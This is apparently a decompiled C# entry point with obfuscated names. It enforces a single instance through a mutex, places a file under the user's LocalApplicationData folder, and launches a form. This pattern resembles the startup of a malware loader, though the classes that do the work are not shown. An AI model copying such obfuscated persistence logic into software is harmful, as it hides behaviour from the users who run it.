using System;
using System.Threading;
using System.Windows.Forms;
using BrowserDene;

internal static class Class1
{
	public static Mutex mutex_0 = new Mutex(initiallyOwned: true, "{8F6F0AC4-B9A1-45fd-A8CF-72F04X6FDEXZ1}");

	[STAThread]
	private static void Main()
	{
		if (mutex_0.WaitOne(TimeSpan.Zero, exitContext: true))
		{
			string object_ = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Class2.string_2;
			Class2.smethod_2();
			Class2.gfPmbcXom(Class2.string_1, object_);
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Class4.mmSswkMzXYVws();
			Form1 form = new Form1();
			Application.Run((Form)(object)form);
			mutex_0.ReleaseMutex();
		}
		else
		{
			Environment.Exit(1);
		}
	}
}
